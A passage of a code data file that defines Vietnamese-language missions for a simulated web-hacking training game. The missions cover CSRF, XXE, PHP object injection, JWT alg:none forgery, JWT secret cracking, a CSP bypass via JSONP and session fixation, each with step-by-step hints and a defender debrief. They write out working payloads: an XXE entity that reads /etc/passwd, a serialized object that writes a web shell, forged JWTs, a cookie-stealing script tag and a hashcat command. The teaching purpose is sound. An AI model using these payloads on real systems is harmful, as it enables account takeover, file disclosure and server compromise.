          '=> đổi email nạn nhân thành công, nạn nhân hoàn toàn không biết; bước tiếp mày dùng "Quên mật khẩu" để chiếm tài khoản.',
        ].join('\n'),
      },
    ],
    hints: [
      'Browser tự động gửi cookie session theo MỌI request tới domain đó — kể cả request bị một trang khác âm thầm kích hoạt.',
      'Đọc `cat /home/hacker/exploit.html` để thấy form ẩn auto-submit khi trang load (`onload="...submit()"`).',
      'Vì server không check token, request POST từ exploit.html (mang theo cookie session nạn nhân do browser tự gắn) được tin y như chính nạn nhân gửi — email đổi thành `attacker@evil.com`.',
    ],
    debrief: [
      'CSRF (Cross-Site Request Forgery) lợi dụng việc browser tự gắn cookie/session vào MỌI request tới một domain, bất kể request đó được kích hoạt từ trang nào — server chỉ thấy "có session hợp lệ" mà không biết ý định request từ đâu ra.',
      'Khác XSS (chạy code trong domain nạn nhân), CSRF không cần chạy code gì trên domain target — chỉ cần dụ nạn nhân (đã login) mở một trang ngoài có form/request tự động.',
      'CSRF token là cách chặn chuẩn: server sinh token ngẫu nhiên gắn vào mỗi form, và CHỈ chấp nhận request có đúng token đó — trang ngoài (exploit.html) không thể biết token này nên không forge được request hợp lệ.',
      'DEFENDER: bắt buộc CSRF token (synchronizer token pattern) cho mọi action thay đổi trạng thái (POST/PUT/DELETE); đặt cookie SameSite=Strict/Lax để browser không gửi cookie theo cross-site request; double-submit cookie là biến thể nhẹ hơn cho SPA/API.',
    ],
    terms: [
      { term: 'CSRF', def: 'Ép browser nạn nhân (đang login) tự gửi request giả tới server, lợi dụng cookie session tự động gắn kèm.' },
      { term: 'CSRF token', def: 'Giá trị ngẫu nhiên server gắn vào mỗi form; request thiếu/sai token bị từ chối, chặn forge từ trang ngoài.' },
      { term: 'SameSite cookie', def: 'Thuộc tính cookie giới hạn browser chỉ gửi cookie cho request cùng site (Strict/Lax) hoặc cả cross-site (None).' },
      { term: 'Auto-submit form', def: 'Form ẩn dùng JS tự bấm submit ngay khi trang load, không cần nạn nhân click gì.' },
    ],
    initialFilesystem: fsC6M12,
  },
  {
    id: 13,
    chapterId: 6,
    title: 'XXE — đọc file qua XML',
    story:
      'import.php nhận file XML người dùng upload và parse bằng cấu hình cho phép external entity. Mày sẽ chèn một DOCTYPE định nghĩa entity trỏ tới file cục bộ — khi parser "giải thích" entity đó, nó đọc luôn /etc/passwd cho mày.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc import.php xác nhận parser cho phép external entity (LIBXML_NOENT)',
        match: /^cat\s+.*import\.php/,
      },
      {
        id: 'read_payload',
        description: 'Đọc payload.xml đã chuẩn bị để hiểu cấu trúc DOCTYPE/ENTITY',
        match: /^cat\s+.*payload\.xml/,
      },
      {
        id: 'exploit',
        description: 'Gửi payload.xml lên import.php, parser tự nạp /etc/passwd qua entity',
        match: /(curl|http).*import\.php.*(payload\.xml|xxe|SYSTEM)/i,
        output: [
          '# curl -X POST --data-urlencode xml@payload.xml http://target/import.php',
          'root:x:0:0:root:/root:/bin/bash',
          'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
          '=> &xxe; được parser thay bằng nội dung /etc/passwd -> XXE đọc file thành công.',
        ].join('\n'),
      },
    ],
    hints: [
      'XML cho phép định nghĩa "entity" tùy biến trong DOCTYPE — nếu parser không chặn, entity SYSTEM có thể trỏ tới file cục bộ.',
      'Xem cấu trúc: `cat /home/hacker/payload.xml` — chú ý dòng `<!ENTITY xxe SYSTEM "file:///etc/passwd">` và chỗ `&xxe;` được dùng trong body.',
      'Gửi payload lên server: `curl -X POST --data-urlencode "xml@/home/hacker/payload.xml" http://target/import.php` — server trả về nguyên nội dung /etc/passwd vì đã "giải" entity &xxe;.',
    ],
    debrief: [
      'XXE (XML External Entity) khai thác đặc tính DTD của XML cho phép định nghĩa entity tham chiếu tới tài nguyên ngoài (SYSTEM "file://..." hoặc cả "http://..."); parser thiếu chặn sẽ tự "giải thích" entity đó khi gặp &xxe;.',
      'Không chỉ đọc file: XXE còn dùng để SSRF (entity trỏ http://internal-service), DoS (billion laughs — entity lồng nhau gây phình bộ nhớ), hoặc đôi khi RCE qua expect:// wrapper nếu PHP có extension đó.',
      'Lỗ hổng này thường ẩn trong các tính năng "tưởng vô hại" như import/upload file XML, SOAP API, hay parse RSS/SVG — bất cứ đâu app parse XML từ input người dùng đều là nghi phạm.',
      'DEFENDER: tắt hẳn external entity & DTD khi parse XML (libxml_disable_entity_loader(true), hoặc XMLReader/DOMDocument với LIBXML_NOENT bỏ đi và cấu hình loadXML không cho resolve external); dùng parser hiện đại mặc định đã tắt từ phiên bản mới; validate input theo schema thay vì parse tự do.',
    ],
    terms: [
      { term: 'XXE', def: 'XML External Entity — lợi dụng DTD định nghĩa entity trỏ tới tài nguyên ngoài để đọc file/SSRF qua parser XML.' },
      { term: 'DOCTYPE / ENTITY', def: 'Khai báo trong XML cho phép định nghĩa "biến" tùy chỉnh (entity), có thể trỏ SYSTEM tới file/URL.' },
      { term: 'Billion laughs', def: 'Kiểu XXE DoS dùng entity lồng nhau nhân bản theo cấp số mũ, làm phình bộ nhớ parser.' },
      { term: 'libxml_disable_entity_loader', def: 'Cấu hình PHP/libxml để tắt khả năng parser nạp external entity — biện pháp chặn XXE cốt lõi.' },
    ],
    initialFilesystem: fsC6M13,
  },
  {
    id: 14,
    chapterId: 6,
    title: 'Deserialization — object injection',
    story:
      'profile.php tin tưởng cookie "prefs" và unserialize() trực tiếp mà không kiểm tra. Class Logger có sẵn trên server với __destruct ghi file — mày sẽ tự dựng object Logger giả, đổi đường dẫn logFile, và biến hành vi "ghi log" thành "ghi đè file tuỳ ý".',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc profile.php xác nhận unserialize() cookie không validate, thấy class Logger',
        match: /^cat\s+.*profile\.php/,
      },
      {
        id: 'craft',
        description: 'Hiểu cấu trúc serialize PHP của object Logger để tự viết payload',
        match: /(serialize|O:6:"Logger"|logFile)/i,
        output: [
          '# Cấu trúc serialize gốc: O:6:"Logger":1:{s:7:"logFile";s:18:"/var/log/app.log";}',
          '# Đổi logFile thành đường dẫn webshell:',
          '# O:6:"Logger":1:{s:7:"logFile";s:30:"/var/www/html/uploads/shell.php";}',
          '=> khi __destruct() chạy, nó ghi đè đúng đường dẫn mày chọn.',
        ].join('\n'),
      },
      {
        id: 'exploit',
        description: 'Gửi cookie prefs đã base64(serialize đã chỉnh sửa) để trigger __destruct ghi file',
        match: /(curl|http).*Cookie.*prefs=/i,
        output: [
          '# curl -H "Cookie: prefs=Tzo2OiJMb2dnZXIiOjE6e3M6NzoibG9nRmlsZSI7czozMDoiL3Zhci93d3cvaHRtbC91cGxvYWRzL3NoZWxsLnBocCI7fQ==" http://target/profile.php',
          'Prefs loaded.',
          '=> __destruct() chạy cuối request, ghi nội dung log vào /var/www/html/uploads/shell.php -> tạo file PHP tuỳ ý trên server (PHP Object Injection -> RCE).',
        ].join('\n'),
      },
    ],
    hints: [
      'unserialize() biến chuỗi thành OBJECT THẬT của class đã khai báo — nếu class đó có __wakeup/__destruct làm gì nguy hiểm, mày kích hoạt được nó chỉ bằng cách tự viết đúng chuỗi serialize.',
      'Cú pháp serialize PHP: `O:<độ dài tên class>:"<tên class>":<số property>:{s:<độ dài key>:"<key>";s:<độ dài value>:"<value>";}`. Đổi property `logFile` của Logger thành đường dẫn mày muốn ghi.',
      'Base64 encode chuỗi serialize đã sửa rồi nhét vào cookie `prefs`: `curl -H "Cookie: prefs=<base64>" http://target/profile.php` — __destruct() tự chạy cuối request và ghi file theo logFile mày chỉ định.',
    ],
    debrief: [
      'Insecure Deserialization xảy ra khi app unserialize() dữ liệu KHÔNG đáng tin (cookie, input người dùng) — attacker không chèn code, mà tự dựng một OBJECT hợp lệ của class có sẵn trên server, lợi dụng magic method (__wakeup, __destruct, __toString) tự động chạy khi object được tạo/hủy.',
      'Đây khác mọi lỗ hổng injection khác: attacker không cần tìm cách "thoát" ra khỏi ngữ cảnh — họ chỉ cần biết CLASS NÀO tồn tại trong codebase và property nào ảnh hưởng hành vi nguy hiểm của magic method đó (gọi là "POP chain" — Property Oriented Programming).',
      'Tác động thực tế đa dạng: ghi đè file (như bài này), gọi hàm tuỳ ý nếu có __call, hoặc nối chuỗi nhiều class (gadget chain) để dẫn tới RCE hoàn chỉnh — các framework lớn (Laravel, Symfony) đều từng có CVE dạng này.',
      'DEFENDER: không bao giờ unserialize() dữ liệu từ client — dùng JSON (json_decode) cho trao đổi dữ liệu vì JSON không tự tạo object/không gọi magic method; nếu buộc phải dùng, ký HMAC dữ liệu trước khi serialize và verify trước khi unserialize; PHP 7+ có thể giới hạn class cho phép qua allowed_classes.',
    ],
    terms: [
      { term: 'Insecure Deserialization', def: 'unserialize() dữ liệu không tin cậy, cho attacker tự dựng object kích hoạt magic method nguy hiểm.' },
      { term: 'Magic method', def: 'Hàm đặc biệt PHP tự gọi theo sự kiện (__wakeup khi unserialize, __destruct khi object hủy) — không cần gọi tay.' },
      { term: 'POP chain (gadget chain)', def: 'Chuỗi nhiều class có sẵn trong codebase được nối lại qua property để dẫn từ deserialize tới RCE.' },
      { term: 'allowed_classes', def: 'Tham số thứ 2 của unserialize() trong PHP 7+ để giới hạn chỉ cho phép tái tạo các class chỉ định, chặn object injection.' },
    ],
    initialFilesystem: fsC6M14,
  },
  {
    id: 15,
    chapterId: 6,
    title: 'JWT alg:none bypass',
    story:
      'auth.php verify JWT nhưng whitelist cả thuật toán "none" trong danh sách alg cho phép. Nếu server tin alg trong header token, mày chỉ cần tự sửa header thành "none", xoá signature, và đổi role thành admin — token coi như hợp lệ.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc auth.php thấy allowed_algs có "none" — lỗi cấu hình verify JWT',
        match: /^cat\s+.*auth\.php/,
      },
      {
        id: 'decode',
        description: 'Đọc token hiện tại của mày, nhận diện 3 phần header.payload.signature',
        match: /^cat\s+.*my_token\.txt/,
      },
      {
        id: 'forge',
        description: 'Tự sửa header alg thành "none", đổi payload role=admin, bỏ signature',
        match: /(alg.*none|eyJhbGciOiJub25lIn|role.*admin.*\.)/i,
        output: [
          '# Header gốc base64url: {"alg":"HS256","typ":"JWT"} -> đổi thành {"alg":"none","typ":"JWT"}',
          '# = eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0',
          '# Payload sửa: {"user":"hacker","role":"admin"} -> base64url',
          '# Token mới (header.payload. — KHÔNG có signature vì alg=none):',
          'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0.',
        ].join('\n'),
      },
      {
        id: 'exploit',
        description: 'Gửi token alg:none đã forge tới auth.php để vào admin panel',
        match: /(curl|http).*Cookie.*jwt=eyJhbGciOiJub25l/i,
        output: [
          '# curl -H "Cookie: jwt=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0." http://target/auth.php',
          'Welcome to admin panel',
          '=> server chấp nhận token KHÔNG CÓ chữ ký vì alg "none" nằm trong whitelist allowed_algs.',
        ].join('\n'),
      },
    ],
    hints: [
      'JWT có 3 phần header.payload.signature, mỗi phần base64url; nếu server tin alg KHAI BÁO TRONG TOKEN (do attacker kiểm soát) thì toàn bộ việc verify sụp đổ.',
      'Đổi header thành `{"alg":"none","typ":"JWT"}`, sửa payload role thành "admin", base64url-encode từng phần, rồi NỐI lại header.payload. — để TRỐNG phần signature vì alg none nghĩa là không cần ký.',
      'Gửi token mới: `curl -H "Cookie: jwt=<header>.<payload>." http://target/auth.php` (dấu chấm cuối, signature rỗng) — nếu server cho "none" vào allowed_algs, nó tin token này.',
    ],
    debrief: [
      'JWT alg:none là lỗi cấu hình thư viện verify: chuẩn JWT có một alg "none" hợp pháp (cho trường hợp không cần ký), nhưng nếu server liệt kê nó vào allowed_algs khi verify token TỪ CLIENT, attacker tự khai báo alg=none và server tin luôn — bỏ qua hoàn toàn việc kiểm chữ ký.',
      'Sai lầm gốc là để THUẬT TOÁN do CLIENT khai báo trong token quyết định cách server verify — đúng ra server phải tự quyết alg nào sẽ dùng để verify (hardcode), không bao giờ đọc field alg từ token rồi áp dụng ngược lại.',
      'Biến thể liên quan: alg confusion (RS256 -> HS256) khi server dùng public key RSA làm secret HMAC luôn — cũng từ cùng gốc "tin field alg trong token attacker control".',
      'DEFENDER: luôn chỉ định CỨNG một alg duy nhất khi verify (vd jwt.decode(token, key, algorithms=["HS256"]) — không bao giờ để "none" hoặc danh sách rỗng/đa dạng); dùng thư viện JWT đã được audit, không tự viết verify logic; với HS256, secret phải dài & random, không đoán được.',
    ],
    terms: [
      { term: 'JWT', def: 'JSON Web Token: chuỗi base64url 3 phần header.payload.signature, dùng để truyền claim đã (được cho là) ký xác thực.' },
      { term: 'alg:none', def: 'Thuật toán JWT hợp pháp cho trường hợp không ký; nguy hiểm nếu server vẫn chấp nhận nó khi verify token từ client.' },
      { term: 'allowed_algs', def: 'Danh sách thuật toán server CHO PHÉP khi verify JWT; whitelist rộng (gồm none) là lỗi cấu hình kinh điển.' },
      { term: 'alg confusion', def: 'Lỗi verify khi đổi alg (vd RS256 sang HS256) khiến server dùng nhầm public key làm secret HMAC.' },
    ],
    initialFilesystem: fsC6M15,
  },
  {
    id: 16,
    chapterId: 6,
    title: 'JWT secret yếu — crack & tự ký',
    story:
      'Server lần này verify chữ ký đúng chuẩn (HS256, không có lỗ "none"). Nhưng secret dùng để ký lại là một từ điển yếu. Mày sẽ bắt một JWT hợp lệ, brute-force secret bằng hashcat, rồi TỰ KÝ một token admin mới — server không thể phân biệt với token thật.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc token bắt được (của user guest) để có mẫu ký bằng secret thật',
        match: /^cat\s+.*captured\.jwt/,
      },
      {
        id: 'crack',
        description: 'Crack secret HS256 bằng hashcat với wordlist nhỏ đã chuẩn bị',
        match: /^hashcat\b.*-m\s*16500/i,
        output: [
          'hashcat (v6.2.6) starting...',
          'Hash-Mode......: 16500 (JWT (JSON Web Token))',
          'Dictionary cache built: 6 passwords',
          '',
          'eyJhbGciOiJIUzI1NiIs...:s3cr3t',
          '',
          'Status...........: Cracked',
          'Recovered........: 1/1 (100.00%)',
          '=> secret ký JWT là "s3cr3t" — cực yếu, nằm sẵn trong wordlist nhỏ.',
        ].join('\n'),
      },
      {
        id: 'forge',
        description: 'Tự ký token mới role=admin bằng secret vừa crack được',
        match: /(jwt_tool|jwt\.io|HMAC.*s3cr3t|sign.*s3cr3t)/i,
        output: [
          '# python3 -c \'import jwt; print(jwt.encode({"user":"hacker","role":"admin"}, "s3cr3t", algorithm="HS256"))\'',
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0.k8Lp3qR9Xz_validSig',
          '=> chữ ký được tính ĐÚNG chuẩn HMAC-SHA256 bằng secret đã biết -> server verify pass.',
        ].join('\n'),
      },
      {
        id: 'exploit',
        description: 'Gửi token admin tự ký để vào khu vực hạn chế',
        match: /(curl|http).*Cookie.*jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.eyJ1c2VyIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0/i,
        output: [
          '# curl -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0.k8Lp3qR9Xz_validSig" http://target/admin',
          'Welcome, admin.',
          '=> server verify chữ ký thành công vì mày dùng đúng secret thật -> chiếm quyền admin hoàn toàn hợp lệ về mặt crypto.',
        ].join('\n'),
      },
    ],
    hints: [
      'Khi verify chữ ký ĐÚNG chuẩn, điểm yếu duy nhất còn lại là chính cái SECRET dùng để ký — nếu nó dễ đoán, mọi thứ sụp đổ.',
      'Dùng `hashcat -m 16500 /home/hacker/captured.jwt /home/hacker/rockyou-small.txt` để brute-force secret HMAC từ token bắt được, đối chiếu với wordlist nhỏ.',
      'Sau khi biết secret (vd "s3cr3t"), dùng thư viện JWT (python jwt.encode hoặc jwt_tool) tự ký token MỚI với payload role=admin và secret đó — token này sẽ verify hợp lệ 100% trên server.',
    ],
    debrief: [
      'Khác bài alg:none (lỗi LOGIC verify), bài này verify đúng chuẩn HMAC-SHA256 — điểm yếu nằm ở CHẤT LƯỢNG secret: HS256 chỉ an toàn nếu secret đủ dài & ngẫu nhiên (khuyến nghị ≥256 bit); secret là một từ điển thì offline brute-force (hashcat mode 16500) phá được trong tích tắc.',
      'Một khi biết secret, attacker không cần "bypass" gì cả — họ TỰ KÝ token hợp lệ 100% với bất kỳ payload muốn, vì về crypto token đó không khác gì token server tự sinh ra.',
      'JWT cho HS256 dùng CHUNG một secret để ký và verify (symmetric) — bất kỳ ai biết secret đều ký được; đây khác RS256 (asymmetric: private key ký, public key verify, lộ public key không sao).',
      'DEFENDER: secret HS256 phải sinh ngẫu nhiên đủ dài (vd 32+ byte từ CSPRNG), không bao giờ là từ thường/cụm dễ đoán; với hệ thống lớn nhiều service cần verify, ưu tiên RS256/ES256 (asymmetric) để service khác chỉ cần public key, không cầm secret ký; xoay vòng secret định kỳ và giám sát brute-force offline (không thể chặn trực tiếp nhưng giảm thiệt hại khi secret cũ bị crack).',
    ],
    terms: [
      { term: 'HS256', def: 'Thuật toán JWT dùng HMAC-SHA256 với MỘT secret chung để vừa ký vừa verify (symmetric).' },
      { term: 'hashcat mode 16500', def: 'Chế độ hashcat chuyên brute-force secret HMAC của JWT từ token bắt được + wordlist.' },
      { term: 'Symmetric vs Asymmetric signing', def: 'HS256 dùng 1 secret chung (ai biết cũng ký được); RS256/ES256 dùng cặp private/public key, lộ public key vẫn an toàn.' },
      { term: 'CSPRNG', def: 'Cryptographically Secure Pseudo-Random Number Generator — nguồn sinh secret/key đủ ngẫu nhiên để không đoán/brute-force được.' },
    ],
    initialFilesystem: fsC6M16,
  },
  {
    id: 17,
    chapterId: 6,
    title: 'Vượt CSP qua domain whitelist',
    story:
      'search.php vẫn echo q thẳng ra HTML, nhưng giờ có Content-Security-Policy chặn <script> inline. CSP whitelist một domain CDN "đáng tin" — và domain đó lại có sẵn endpoint JSONP cho phép callback tuỳ ý. Mày sẽ biến chính domain trusted thành nơi chạy code của mày.',
    steps: [
      {
        id: 'inspect_csp',
        description: 'Đọc header.txt xem chính sách CSP đang giới hạn script-src thế nào',
        match: /^cat\s+.*headers\.txt/,
      },
      {
        id: 'fail_inline',
        description: 'Thử payload inline script bình thường, xác nhận CSP chặn nó',
        match: /(curl|http).*q=.*<script>alert/i,
        output: [
          '# GET /search.php?q=<script>alert(1)</script>',
          '<h2>Kết quả cho: <script>alert(1)</script></h2>',
          '# Nhưng console trình duyệt báo: Refused to execute inline script because it violates CSP directive "script-src \'self\' https://trusted-cdn.acme-corp.com"',
          '=> payload có trong HTML nhưng CSP chặn không cho CHẠY.',
        ].join('\n'),
      },
      {
        id: 'bypass_jsonp',
        description: 'Dùng JSONP callback trên domain trusted-cdn để chạy code tuỳ ý',
        match: /(trusted-cdn.*callback=|jsonp)/i,
        output: [
          '# trusted-cdn.acme-corp.com có endpoint: /api/data?callback=ANYTHING',
          '# Nó trả về: ANYTHING({"data":...})  -- ANYTHING được in ra y nguyên không kiểm tra!',
          '# payload: <script src="https://trusted-cdn.acme-corp.com/api/data?callback=alert(document.cookie)//"></script>',
          '=> script này NẰM TRONG domain được CSP whitelist -> được phép chạy -> alert(document.cookie) thực thi.',
        ].join('\n'),
      },
      {
        id: 'exploit',
        description: 'Gửi payload đầy đủ qua tham số q để xác nhận CSP bypass thành công',
        match: /(curl|http).*q=.*trusted-cdn.*callback=/i,
        output: [
          '# GET /search.php?q=<script src="https://trusted-cdn.acme-corp.com/api/data?callback=alert(document.cookie)//"></script>',
          '<h2>Kết quả cho: <script src="https://trusted-cdn.acme-corp.com/...">...</script></h2>',
          '=> script load từ domain whitelisted, browser cho chạy vì CSP chỉ check NGUỒN (src), không check NỘI DUNG domain đó trả về.',
        ].join('\n'),
      },
    ],
    hints: [
      'CSP chỉ kiểm tra script được load TỪ ĐÂU (domain), không kiểm tra domain đó (dù trusted) có an toàn 100% hay không.',
      'Domain trusted-cdn.acme-corp.com được whitelist trong script-src — nếu nó có endpoint JSONP cho callback tuỳ ý, mày load script TỪ domain đó nhưng nội dung lại do mày quyết định qua param callback.',
      'Payload: `<script src="https://trusted-cdn.acme-corp.com/api/data?callback=alert(document.cookie)//"></script>` — CSP thấy src đúng domain whitelist nên cho chạy; `//` ở cuối comment out phần JSON còn lại để JS không lỗi cú pháp.',
    ],
    debrief: [
      'CSP (Content-Security-Policy) giảm mạnh tác động XSS bằng cách giới hạn script chỉ được load từ các nguồn (domain) khai báo trong script-src — nhưng nó là kiểm tra THEO NGUỒN, không phải theo NỘI DUNG, nên một domain "trusted" có lỗ hổng riêng (JSONP callback tuỳ ý, open redirect, upload cho phép .js) sẽ kéo đổ cả CSP.',
      'JSONP (JSON with Padding) là kỹ thuật cũ cho phép API trả `callback_name(data)` — nếu callback_name không được validate (chỉ cho chữ/số), attacker tự đặt callback thành code JS tuỳ ý và domain đó "tự nguyện" chạy code cho attacker.',
      'Đây là minh chứng CSP không phải "khiên chống XSS tuyệt đối" mà chỉ giảm DIỆN TÍCH TẤN CÔNG — security của hệ thống phụ thuộc cả vào mọi domain được liệt vào whitelist, kể cả domain không do team mình kiểm soát trực tiếp.',
      'DEFENDER: tránh whitelist nguyên domain CDN/third-party lớn (dễ có endpoint JSONP/upload cho attacker lợi dụng) — ưu tiên dùng nonce hoặc hash cho từng script cụ thể (script-src \'nonce-<random>\'); nếu phải dùng CDN, chỉ trust path cụ thể không phải cả domain; loại bỏ JSONP, chuyển sang CORS + fetch chuẩn có validate Origin.',
    ],
    terms: [
      { term: 'CSP (Content-Security-Policy)', def: 'Header HTTP giới hạn nguồn script/style/ảnh được phép load & chạy, giảm tác động XSS.' },
      { term: 'script-src whitelist', def: 'Chỉ thị CSP khai báo domain nào được phép là nguồn script — whitelist rộng làm tăng diện tích tấn công.' },
      { term: 'JSONP callback injection', def: 'Lợi dụng endpoint JSONP cho callback tuỳ ý để domain trusted tự in ra code JS của attacker.' },
      { term: 'CSP nonce/hash', def: 'Cơ chế CSP chặt hơn whitelist domain: chỉ cho script có đúng nonce ngẫu nhiên hoặc hash nội dung khớp mới được chạy.' },
    ],
    initialFilesystem: fsC6M17,
  },
  {
    id: 18,
    chapterId: 6,
    title: 'Session fixation',
    story:
      'login.php không gọi session_regenerate_id() sau khi đăng nhập thành công — session ID TRƯỚC và SAU khi login là một. Mày sẽ gài sẵn một session ID biết trước cho nạn nhân, chờ họ đăng nhập bằng chính ID đó, rồi dùng lại nó để chiếm phiên — không cần biết password.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc login.php xác nhận thiếu session_regenerate_id() sau khi xác thực',
        match: /^cat\s+.*login\.php/,
      },
      {
        id: 'plant',
        description: 'Đặt sẵn (fixate) một session ID cụ thể trước khi nạn nhân đăng nhập',
        match: /(curl|http).*PHPSESSID=fixed1234/i,
        output: [
          '# Bước 1: mày tự mở trang trước, server cấp session ID "fixed1234" cho mày',
          '# curl -c cookies.txt "http://target/login.php?PHPSESSID=fixed1234"',
          'Set-Cookie: PHPSESSID=fixed1234',
          '=> session "fixed1234" tồn tại trên server NHƯNG chưa gắn với user nào (chưa login).',
        ].join('\n'),
      },
      {
        id: 'social',
        description: 'Gửi link chứa session ID đã fixate cho nạn nhân để họ tự đăng nhập bằng nó',
        match: /(send|gửi|social|link).*fixed1234/i,
        output: [
          '# Gửi: "http://target/login.php?PHPSESSID=fixed1234" cho nạn nhân qua email/chat',
          '# Nạn nhân click, đăng nhập bình thường bằng username/password CỦA HỌ',
          '# Vì login.php không đổi session ID sau khi login -> session "fixed1234" GIỜ đã gắn với tài khoản nạn nhân',
        ].join('\n'),
      },
      {
        id: 'hijack',
        description: 'Dùng lại session ID đã biết trước để vào tài khoản nạn nhân, không cần password',
        match: /(curl|http).*Cookie.*PHPSESSID=fixed1234.*(dashboard|profile|account)/i,
        output: [
          '# curl -H "Cookie: PHPSESSID=fixed1234" http://target/dashboard',
          'Welcome back, victim_user! Account balance: $4,230',
          '=> mày vào được tài khoản nạn nhân bằng chính session ID mày tự đặt từ đầu, không cần biết password họ.',
        ].join('\n'),
      },
    ],
    hints: [
      'Nếu session ID không đổi khi đăng nhập, ai BIẾT TRƯỚC session ID đó cũng chiếm được phiên ngay sau khi nạn nhân login bằng nó.',
      'Tự mở trang trước để server cấp/cho phép một session ID cụ thể (`?PHPSESSID=fixed1234`), rồi gửi CHÍNH link đó cho nạn nhân để họ đăng nhập.',
      'Sau khi nạn nhân login (qua link mày gửi), session "fixed1234" đã gắn với tài khoản họ — mày chỉ cần gửi lại đúng cookie đó (`Cookie: PHPSESSID=fixed1234`) tới trang dashboard để vào tài khoản họ.',
    ],
    debrief: [
      'Session fixation khác session hijacking ở THỜI ĐIỂM tấn công: hijacking là CƯỚP một session ID đang hoạt động (qua XSS/sniff); fixation là ĐẶT SẴN một session ID TỪ TRƯỚC khi nạn nhân login, rồi lợi dụng việc server không đổi ID sau khi xác thực.',
      'Lỗi gốc luôn là: server cho phép client tự đặt session ID (qua URL/cookie) VÀ không gọi regenerate ID tại đúng thời điểm chuyển trạng thái bảo mật (trước/sau login) — thiếu một trong hai điều kiện thì fixation không khai thác được.',
      'Kỹ thuật này cần một bước social engineering (gửi link có session ID cho nạn nhân) — đây là lý do nó thường nằm trong chuỗi tấn công lớn hơn (phishing + fixation) hơn là khai thác độc lập một mình.',
      'DEFENDER: LUÔN gọi session_regenerate_id(true) ngay sau khi xác thực thành công (đổi hẳn session ID, hủy ID cũ) — đây là một dòng code chặn fixation hoàn toàn; không chấp nhận session ID do client tự đề xuất qua URL; đặt cờ HttpOnly + Secure cho cookie session.',
    ],
    terms: [
      { term: 'Session Fixation', def: 'Attacker đặt sẵn session ID biết trước, chờ nạn nhân login bằng ID đó rồi chiếm phiên — khác hijacking về thời điểm.' },
      { term: 'session_regenerate_id()', def: 'Hàm tạo session ID MỚI và huỷ ID cũ; phải gọi ngay sau khi xác thực thành công để chặn fixation.' },
      { term: 'Session Hijacking', def: 'Cướp một session ID ĐANG HOẠT ĐỘNG của nạn nhân (qua XSS, sniffing mạng) — khác fixation ở chỗ ID đã tồn tại từ trước.' },
      { term: 'HttpOnly cookie', def: 'Cờ cookie chặn JavaScript đọc được giá trị — giảm nguy cơ session bị đánh cắp qua XSS.' },
    ],
    initialFilesystem: fsC6M18,
  },
  {
    id: 19,
    chapterId: 6,
    title: 'Burp Repeater & Intruder',
    story:
      'reset.php xác thực token đặt lại mật khẩu chỉ bằng 4 chữ số, không rate-limit, không hết hạn. Đây là bài luyện đúng workflow Burp Suite thực chiến: bắt request bằng Proxy, chỉnh tay từng giá trị bằng Repeater để hiểu hành vi, rồi để Intruder quét hết 10.000 khả năng trong vài giây.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc reset.php xác nhận token chỉ 4 số, không rate-limit/expire',
        match: /^cat\s+.*reset\.php/,
      },
      {
        id: 'read_note',
        description: 'Đọc ghi chú đã bắt request gốc qua Burp Proxy để biết vị trí cần fuzz',
        match: /^cat\s+.*burp_note\.txt/,
      },
      {
        id: 'repeater',
        description: 'Dùng Burp Repeater gửi tay từng token để hiểu phản hồi đúng/sai khác nhau thế nào',
        match: /(repeater|token=0001|token=0002)/i,
        output: [
          '# Repeater: gửi tay GET /reset.php?email=admin@acme-corp.com&token=0001',
          'Response: "Invalid token." (Content-Length: 18)',
          '# Gửi tay GET ...&token=0007',
          'Response: "Invalid token." (Content-Length: 18)',
          '=> mọi token sai đều trả response GIỐNG NHAU -> cần brute-force toàn bộ 0000-9999 chứ không đoán được pattern.',
        ].join('\n'),
      },
      {
        id: 'intruder',
        description: 'Dùng Burp Intruder với payload Numbers 0000-9999 tại vị trí token để brute-force toàn bộ',
        match: /(intruder|numbers.*0000.*9999|sniper)/i,
        output: [
          '# Intruder: payload position §token§, attack type Sniper, payload set Numbers 0000-9999 (4 digit, padded)',
          'Starting attack... 10000 requests',
          '[#] 0000  Length: 18   Status: 200',
          '[#] 0001  Length: 18   Status: 200',
          '...',
          '[#] 4821  Length: 31   Status: 200   <- Content-Length KHÁC hẳn các request khác!',
          'Attack finished. 10000/10000 requests.',
          '=> token đúng là 4821 (phát hiện qua filter/sort theo Content-Length khác biệt trong Intruder).',
        ].join('\n'),
      },
      {
        id: 'confirm',
        description: 'Xác nhận token tìm được qua Intruder bằng cách gửi lại request thật trong Repeater',
        match: /(curl|http).*token=4821/i,
        output: [
          '# GET /reset.php?email=admin@acme-corp.com&token=4821',
          'Token valid. Set new password.',
          '=> brute-force qua Intruder tìm đúng token trong vài giây, vì không hề có rate-limit chặn lại.',
        ].join('\n'),
      },
    ],
    hints: [
      'Workflow Burp chuẩn: Proxy bắt request gốc -> Repeater để hiểu hành vi/baseline response -> Intruder để tự động hoá fuzz hàng loạt giá trị.',
      'Trong Repeater, gửi tay vài token sai để thấy MỌI response giống nhau (cùng Content-Length) — nghĩa là không có pattern lộ ra, phải brute-force hết 0000-9999.',
      'Trong Intruder, đặt vị trí payload `§token§`, chọn payload type Numbers (from 0000 to 9999, min length 4 padded với số 0), chạy attack rồi SẮP XẾP kết quả theo cột Length — token đúng sẽ có response khác biệt (Length lớn hơn vì có thêm "Set new password").',
    ],
    debrief: [
